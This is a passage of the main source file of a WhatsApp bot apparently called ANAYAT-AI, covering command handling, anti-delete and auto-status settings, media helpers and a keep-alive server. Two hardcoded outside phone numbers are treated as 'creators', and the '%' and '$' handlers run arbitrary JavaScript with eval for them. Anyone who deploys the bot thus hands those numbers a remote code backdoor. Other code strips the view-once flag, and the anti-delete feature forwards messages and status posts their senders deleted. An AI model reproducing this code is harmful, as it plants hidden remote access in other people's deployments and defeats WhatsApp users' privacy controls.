      const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
      const senderNumber = sender.split('@')[0];
      const botNumber = conn.user.id.split(':')[0];
      const pushname = mek.pushName || 'Sin Nombre';
      const isMe = botNumber.includes(senderNumber);
      const isOwner = ownerNumber.includes(senderNumber) || isMe;
      const botNumber2 = await jidNormalizedUser(conn.user.id);
      const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
      const groupName = isGroup ? groupMetadata.subject : '';
      const participants = isGroup ? await groupMetadata.participants : '';
      const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
      const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
      const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
      const isReact = m.message.reactionMessage ? true : false;

      const reply = (teks) => {
        conn.sendMessage(from, { text: teks }, { quoted: mek });
      };

      const udp = botNumber.split(`@`)[0];
      const Anayat = ['923452401207','923498011451'];
      const dev = [];

      let isCreator = [udp, ...Anayat, ...dev]
        .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
        .includes(sender);

      // ================== ANTI-DELETE COMMANDS ==================
      if (isCreator && command === 'antidelete') {
        const arg = args[0]?.toLowerCase();
        
        if (arg === 'on') {
          global.antiDeleteSettings.enabled = true;
          saveAntiDeleteSettings(global.antiDeleteSettings);
          reply('✅ *Anti-Delete ENABLED*\n\nDeleted messages (text, images, videos, voice, status) will be sent to your DM.');
        } else if (arg === 'off') {
          global.antiDeleteSettings.enabled = false;
          saveAntiDeleteSettings(global.antiDeleteSettings);
          reply('❌ *Anti-Delete DISABLED*');
        } else {
          reply(`*🗑️ ANTI-DELETE STATUS*\n\nCurrent: ${global.antiDeleteSettings.enabled ? '✅ ENABLED' : '❌ DISABLED'}\n\n*Usage:*\n${prefix}antidelete on - Enable\n${prefix}antidelete off - Disable\n\n*Supports:* Text, Images, Videos, Voice, Audio, Stickers, Documents, View-Once, Status`);
        }
        return;
      }

      // ================== AUTO STATUS COMMANDS ==================
      if (isCreator && command === 'autostatus') {
        const subCmd = args[0]?.toLowerCase();
        
        if (!subCmd) {
          const viewStatus = global.autoStatusSettings.viewEnabled ? '✅ ON' : '❌ OFF';
          const reactStatus = global.autoStatusSettings.reactEnabled ? '✅ ON' : '❌ OFF';
          const replyStatus = global.autoStatusSettings.replyEnabled ? '✅ ON' : '❌ OFF';
          
          reply(`*⚙️ AUTO STATUS SETTINGS*\n\n📱 *View:* ${viewStatus}\n💫 *React:* ${reactStatus}\n📩 *Reply:* ${replyStatus}\n\n*Commands:*\n${prefix}autostatus view on/off\n${prefix}autostatus react on/off\n${prefix}autostatus reply on/off`);
          return;
        }
        
        if (subCmd === 'view') {
          const action = args[1]?.toLowerCase();
          if (action === 'on') {
            global.autoStatusSettings.viewEnabled = true;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('✅ *Auto Status View ENABLED*');
          } else if (action === 'off') {
            global.autoStatusSettings.viewEnabled = false;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('❌ *Auto Status View DISABLED*');
          }
        } else if (subCmd === 'react') {
          const action = args[1]?.toLowerCase();
          if (action === 'on') {
            global.autoStatusSettings.reactEnabled = true;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('✅ *Auto Status React ENABLED*');
          } else if (action === 'off') {
            global.autoStatusSettings.reactEnabled = false;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('❌ *Auto Status React DISABLED*');
          }
        } else if (subCmd === 'reply') {
          const action = args[1]?.toLowerCase();
          if (action === 'on') {
            global.autoStatusSettings.replyEnabled = true;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('✅ *Auto Status Reply ENABLED*');
          } else if (action === 'off') {
            global.autoStatusSettings.replyEnabled = false;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('❌ *Auto Status Reply DISABLED*');
          }
        }
        return;
      }

      // SHELL & EVAL COMMANDS
      if (isCreator && mek.text.startsWith('%')) {
        let code = budy.slice(2);
        if (!code) {
          reply(`Provide me with a query to run Master!`);
          return;
        }
        try {
          let resultTest = eval(code);
          if (typeof resultTest === 'object')
            reply(util.format(resultTest));
          else reply(util.format(resultTest));
        } catch (err) {
          reply(util.format(err));
        }
        return;
      }

      if (isCreator && mek.text.startsWith('$')) {
        let code = budy.slice(2);
        if (!code) {
          reply(`Provide me with a query to run Master!`);
          return;
        }
        try {
          let resultTest = await eval(
            'const a = async()=>{\n' + code + '\n}\na()',
          );
          let h = util.format(resultTest);
          if (h === undefined) return console.log(h);
          else reply(h);
        } catch (err) {
          if (err === undefined)
            return console.log('error');
          else reply(util.format(err));
        }
        return;
      }

      // OWNER REACT
      if (senderNumber.includes("923452401207") && !isReact) {
        const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
      }

      // AUTO REACT
      if (!isReact && config.AUTO_REACT === 'true') {
        const reactions = [
          '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
          '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
          '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
          '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
          '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
          '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
          '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
          '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
          '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
          '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
          '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
          '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
          '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
          '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
          '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
        ];
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
      }

      // CUSTOM REACT
      if (!isReact && config.CUSTOM_REACT === 'true') {
        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
      }

      // MODE CHECK
      if(!isOwner && config.MODE === "private") return;
      if(!isOwner && isGroup && config.MODE === "inbox") return;
      if(!isOwner && !isGroup && config.MODE === "groups") return;

      // COMMAND HANDLER
      const events = require('./command');
      const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
      
      if (isCmd) {
        const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
        if (cmd) {
          if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
          
          try {
            cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
          } catch (e) {
            log("[PLUGIN ERROR] " + e, 'red', true);
          }
        }
      }

      events.commands.map(async(command) => {
        if (body && command.on === "body") {
          command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
        } else if (mek.q && command.on === "text") {
          command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
        } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
          command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
        } else if (command.on === "sticker" && mek.type === "stickerMessage") {
          command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
        }
      });

    } catch (e) {
      log('Message handler error: ' + e, 'red', true);
    }
  });

  // ================== HELPER FUNCTIONS ==================
  conn.decodeJid = jid => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (
        (decode.user &&
          decode.server &&
          decode.user + '@' + decode.server) ||
        jid
      );
    } else return jid;
  };

  conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
    let vtype;
    if (options.readViewOnce) {
      message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
      vtype = Object.keys(message.message.viewOnceMessage.message)[0];
      delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
      delete message.message.viewOnceMessage.message[vtype].viewOnce;
      message.message = {
        ...message.message.viewOnceMessage.message
      };
    }
  
    let mtype = Object.keys(message.message)[0];
    let content = await generateForwardMessageContent(message, forceForward);
    let ctype = Object.keys(content)[0];
    let context = {};
    if (mtype != "conversation") context = message.message[mtype].contextInfo;
    content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo
    };
    const waMessage = await generateWAMessageFromContent(jid, content, options ? {
      ...content[ctype],
      ...options,
      ...(options.contextInfo ? {
        contextInfo: {
          ...content[ctype].contextInfo,
          ...options.contextInfo
        }
      } : {})
    } : {});
    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
    return waMessage;
  };

  conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    let type = await FileType.fromBuffer(buffer);
    trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
    await fs.writeFileSync(trueFileName, buffer);
    return trueFileName;
  };

  conn.downloadMediaMessage = async(message) => {
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
  };

  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = '';
    let res = await axios.head(url);
    mime = res.headers['content-type'];
    if (mime.split("/")[1] === "gif") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
    }
    let type = mime.split("/")[0] + "Message";
    if (mime === "application/pdf") {
      return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
    }
    if (mime.split("/")[0] === "image") {
      return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
    }
    if (mime.split("/")[0] === "video") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
    }
    if (mime.split("/")[0] === "audio") {
      return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
    }
  };

  conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === 'ephemeralMessage';
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === 'string') msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== 'string') msg[mtype] = {
      ...content,
      ...options
    };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === conn.user.id;
  
    return proto.WebMessageInfo.fromObject(copy);
  };

  conn.getFile = async(PATH, save) => {
    let res;
    let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
    let type = await FileType.fromBuffer(data) || {
      mime: 'application/octet-stream',
      ext: '.bin'
    };
    let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
    if (data && save) fs.promises.writeFile(filename, data);
    return {
      res,
      filename,
      size: await getSizeMedia(data),
      ...type,
      data
    };
  };

  conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
    let types = await conn.getFile(PATH, true);
    let { filename, size, ext, mime, data } = types;
    let type = '',
        mimetype = mime,
        pathFile = filename;
    if (options.asDocument) type = 'document';
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif.js');
      let media = { mimetype: mime, data };
      pathFile = await writeExif(media, { packname: config.packname, author: config.packname, categories: options.categories ? options.categories : [] });
      await fs.promises.unlink(filename);
      type = 'sticker';
      mimetype = 'image/webp';
    } else if (/image/.test(mime)) type = 'image';
    else if (/video/.test(mime)) type = 'video';
    else if (/audio/.test(mime)) type = 'audio';
    else type = 'document';
    await conn.sendMessage(jid, {
      [type]: { url: pathFile },
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options });
    return fs.promises.unlink(pathFile);
  };

  conn.parseMention = async(text) => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
  };

  conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
    let types = await conn.getFile(path, true);
    let { mime, ext, res, data, filename } = types;
    if (res && res.status !== 200 || file.length <= 65536) {
      try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
    }
    let type = '',
        mimetype = mime,
        pathFile = filename;
    if (options.asDocument) type = 'document';
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif');
      let media = { mimetype: mime, data };
      pathFile = await writeExif(media, { packname: options.packname ? options.packname : config.packname, author: options.author ? options.author : config.author, categories: options.categories ? options.categories : [] });
      await fs.promises.unlink(filename);
      type = 'sticker';
      mimetype = 'image/webp';
    } else if (/image/.test(mime)) type = 'image';
    else if (/video/.test(mime)) type = 'video';
    else if (/audio/.test(mime)) type = 'audio';
    else type = 'document';
    await conn.sendMessage(jid, {
      [type]: { url: pathFile },
      caption,
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options });
    return fs.promises.unlink(pathFile);
  };

  conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifVid(buff, options);
    } else {
      buffer = await videoToWebp(buff);
    }
    await conn.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };

  conn.sendImageAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifImg(buff, options);
    } else {
      buffer = await imageToWebp(buff);
    }
    await conn.sendMessage(
      jid,
      { sticker: { url: buffer }, ...options },
      options
    );
  };

  conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted });

  conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
    return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };

  conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted });

  conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
    let buttonMessage = {
      text,
      footer,
      buttons,
      headerType: 2,
      ...options
    };
    conn.sendMessage(jid, buttonMessage, { quoted, ...options });
  };

  conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
    let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer });
    var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
      templateMessage: {
        hydratedTemplate: {
          imageMessage: message.imageMessage,
          "hydratedContentText": text,
          "hydratedFooterText": footer,
          "hydratedButtons": but
        }
      }
    }), options);
    conn.relayMessage(jid, template.message, { messageId: template.key.id });
  };

  conn.getName = (jid, withoutContact = false) => {
    id = conn.decodeJid(jid);
    withoutContact = conn.withoutContact || withoutContact;
    let v;
    if (id.endsWith('@g.us'))
      return new Promise(async resolve => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject))
          v = conn.groupMetadata(id) || {};
        resolve(
          v.name ||
          v.subject ||
          PhoneNumber(
            '+' + id.replace('@s.whatsapp.net', ''),
          ).getNumber('international'),
        );
      });
    else
      v =
        id === '0@s.whatsapp.net'
          ? {
            id,
            name: 'WhatsApp',
          }
          : id === conn.decodeJid(conn.user.id)
          ? conn.user
          : store.contacts[id] || {};
    return (
      (withoutContact ? '' : v.name) ||
      v.subject ||
      v.verifiedName ||
      PhoneNumber(
        '+' + jid.replace('@s.whatsapp.net', ''),
      ).getNumber('international')
    );
  };

  conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
    let list = [];
    for (let i of kon) {
      list.push({
        displayName: await conn.getName(i + '@s.whatsapp.net'),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
          i + '@s.whatsapp.net',
        )}\nFN:${
          global.OwnerName
        }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
          global.email
        }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
          global.github
        }/FAIZAN-MD\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
          global.location
        };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    conn.sendMessage(
      jid,
      {
        contacts: {
          displayName: `${list.length} Contact`,
          contacts: list,
        },
        ...opts,
      },
      { quoted },
    );
  };

  conn.setStatus = status => {
    conn.query({
      tag: 'iq',
      attrs: {
        to: '@s.whatsapp.net',
        type: 'set',
        xmlns: 'status',
      },
      content: [
        {
          tag: 'status',
          attrs: {},
          content: Buffer.from(status, 'utf-8'),
        },
      ],
    });
    return status;
  };

  conn.serializeM = mek => sms(conn, mek, store);

  // ================== CLEANUP INTERVALS ==================
  setInterval(() => {
    try {
      const sessionPath = sessionDir;
      if (!fs.existsSync(sessionPath)) return;
      
      fs.readdir(sessionPath, (err, files) => {
        if (err) return;
        const now = Date.now();
        
        const oldFiles = files.filter((item) => {
          const filePath = path.join(sessionPath, item);
          try {
            const stats = fs.statSync(filePath);
            return (
              (item.startsWith("pre-key") || 
               item.startsWith("sender-key") || 
               item.startsWith("session-") || 
               item.startsWith("app-state")) &&
              item !== 'creds.json' &&
              now - stats.mtimeMs > 3 * 24 * 60 * 60 * 1000
            );
          } catch (e) {
            return false;
          }
        });
        
        if (oldFiles.length > 0) {
          log(`Clearing ${oldFiles.length} old session files`, 'cyan');
          oldFiles.forEach((file) => {
            try {
              fs.unlinkSync(path.join(sessionPath, file));
            } catch (e) {
              // Ignore
            }
          });
        }
      });
    } catch (error) {
      // Ignore
    }
  }, 3 * 60 * 60 * 1000);

  setInterval(cleanupJunkFiles, 60000);
  setInterval(cleanupTempMedia, 30 * 60 * 1000);

  setInterval(() => {
    if (global.messageCache.size > 300) {
      const keysToDelete = Array.from(global.messageCache.keys()).slice(0, 100);
      keysToDelete.forEach(key => global.messageCache.delete(key));
      log(`🧹 Cleared ${keysToDelete.length} cached messages`, 'cyan');
    }
  }, 10 * 60 * 1000);

  return conn;
}

// =================== EXPRESS SERVER ===================
const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

app.disable('x-powered-by');
app.disable('etag');

app.get("/", (req, res) => {
  res.send("ANAYAT-AI STARTED ✅");
});

app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'ok', 
    uptime: process.uptime(),
    connected: global.isBotConnected,
    timestamp: new Date().toISOString()
  });
});

app.get('/ping', (req, res) => {
  res.status(200).send('pong');
});

app.listen(port, () => log(`Server listening on http://localhost:${port}`, 'green'));

// =================== KEEP-ALIVE ===================
if (process.env.RENDER_EXTERNAL_URL || process.env.DYNO || process.env.KOYEB_PUBLIC_DOMAIN) {
  setInterval(() => {
    try {
      const baseUrl = process.env.RENDER_EXTERNAL_URL || 
                     `https://${process.env.HEROKU_APP_NAME}.herokuapp.com` ||
                     `https://${process.env.KOYEB_PUBLIC_DOMAIN}`;
      
      if (baseUrl && baseUrl !== 'undefined') {
        axios.get(`${baseUrl}/ping`).catch(() => {});
        log('🔄 Keep-alive ping sent', 'cyan');
      }
    } catch (error) {
      // Ignore
    }
  }, 5 * 60 * 1000);
}

// =================== MAIN INIT ===================
setTimeout(() => {
  connectToWA();
}, 4000);

// =================== ERROR HANDLERS ===================
process.on('uncaughtException', (err) => {
  log(`Uncaught Exception: ${err.message}`, 'red', true);
});

process.on('unhandledRejection', (err) => {
  log(`Unhandled Rejection: ${err.message}`, 'red', true);
});

process.on('SIGTERM', () => {
  log('SIGTERM received, cleaning up...', 'yellow');
  process.exit(0);
});

process.on('SIGINT', () => {
  log('SIGINT received, cleaning up...', 'yellow');
  process.exit(0);
});

setInterval(() => {
  const used = process.memoryUsage();
  const mb = (bytes) => Math.round(bytes / 1024 / 1024);
  
  if (mb(used.heapUsed) > 400) {
    log(`⚠️ High memory: ${mb(used.heapUsed)}MB - Running GC`, 'yellow');
    if (global.gc) {
      global.gc();
      log('✅ GC completed', 'green');
    }
  }
}, 15 * 60 * 1000);

log('✅ ANAYAT-AI Bot initialized!', 'green');
